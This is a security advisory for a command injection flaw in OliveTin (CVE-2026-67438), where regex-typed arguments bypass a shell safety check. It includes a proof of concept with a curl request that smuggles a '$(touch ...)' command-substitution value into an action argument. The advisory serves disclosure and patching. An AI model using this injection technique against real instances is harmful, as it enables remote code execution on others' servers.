# [M] OliveTin OS Command Injection via Custom regex: Argument Type Bypassing Shell Safety Check

## Summary
Severity: Medium
Advisory: GHSA-xc5w-4v5w-7x65
CVE: CVE-2026-67438
CWE: CWE-78
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-30
Source: https://github.com/advisories/GHSA-xc5w-4v5w-7x65
Type: github-advisory

## Affected
- Go: `github.com/OliveTin/OliveTin` — affected >=0.0.0-20251025234746-ef5a67e7b8ea <0.0.0-20260708084548-995ff79736f2

## Details
### Summary
OliveTin's checkShellArgumentSafety() function maintains a blocklist of argument types unsafe for Shell mode actions, but does not include regex:-prefixed types. Because regex: support was added independently via typeSafetyCheckRegex(), any Shell mode action using a regex:-typed argument bypasses the safety check unconditionally. The unvalidated value is then interpolated directly into the sh -c command string via Go's text/template with no escaping, enabling shell injection. Notably, even restrictive-looking patterns are exploitable — for example, a pattern blocking common shell metacharacters remains bypassable via POSIX command substitution.

### Details
OliveTin is an open source web UI for running pre-configured shell commands. In the OliveTin service component, the function checkShellArgumentSafety() in service/internal/executor/arguments.go enforces a blocklist of argument types that are unsafe for use in Shell mode actions (actions that execute via sh -c). The blocklist includes password, very_dangerous_raw_string, url, email, and raw_string_multiline. It does not handle custom regex: prefixed argument types.

Custom regex: types are supported by a separate function, typeSafetyCheckRegex(), which checks whether a submitted value matches the provided pattern. These two functions evolved independently: when regex: prefix support was added to typeSafetyCheckRegex, checkShellArgumentSafety was not updated to treat regex: types as unsafe for Shell mode. As a result, any action configured with a Shell mode handler and a regex:-typed argument passes the safety check unconditionally, regardless of how permissive or restrictive the pattern is.

The argument value then reaches handleShellBranch → wrapCommandInShell, where Go's text/template interpolates it directly into the sh -c command string with no escaping.

Critically, this vulnerability is not limited to obviously permissive patterns like regex:.*. An admin who writes a restrictive-looking pattern such as regex: ^[^;|&<>]+$ - explicitly blocking the five most common shell injection characters (semicolon, pipe, ampersand, both redirects) — is still fully exploitable via POSIX command substitution.


### PoC
1. Deploy OliveTin
```bash
docker run -d --name olivetin-poc -p 1337:1337 \
  -v /tmp/olivetin-poc/config:/config \
  ghcr.io/olivetin/olivetin:3000.11.3
```
2. Write the configuration below as /tmp/olivetin-poc/config/config.yaml , which represents a realistic admin-authored action: a Shell mode command that accepts user-supplied input validated by a custom regex pattern.
```yaml
actions:
  - title: Custom Input Action
    id: custom_input
    shell: echo "Input was {{ .Arguments.customInput }}"
    arguments:
      - name: customInput
        type: "regex:^[^;|&<>]+$"
        title: Custom Input
```
3. Trigger RCE via command substitution.

```bash
curl -s -X POST http://localhost:1337/api/v1/StartAction \
  -H "Content-Type: application/json" \
  -d '{"bindingId":"custom_input","arguments":[{"name":"customInput","value":"$(touch /tmp/rce_proof)"}]}'
```
4. Now verify RCE by checking presence of file
```bash
docker exec olivetin-poc ls -la /tmp/rce_proof
```
<img width="1533" height="319" alt="olivetin_proof" src="https://github.com/user-attachments/assets/82c9cc50-8f05-41f8-8cee-bceb3d4b3a2d" />


### Impact
An unauthenticated attacker with network access to an OliveTin instance can achieve full OS command injection - and in practice remote code execution — as the OliveTin process user, provided a Shell mode action exists with any regex:-typed argument whose pattern permits $, backtick, or parentheses.

## References
- https://github.com/OliveTin/OliveTin/security/advisories/GHSA-xc5w-4v5w-7x65
- https://nvd.nist.gov/vuln/detail/CVE-2026-67438
- https://github.com/OliveTin/OliveTin/commit/995ff79736f2bccc364448a3ece84087b550b232
- https://github.com/OliveTin/OliveTin
- https://github.com/OliveTin/OliveTin/releases/tag/3000.17.0
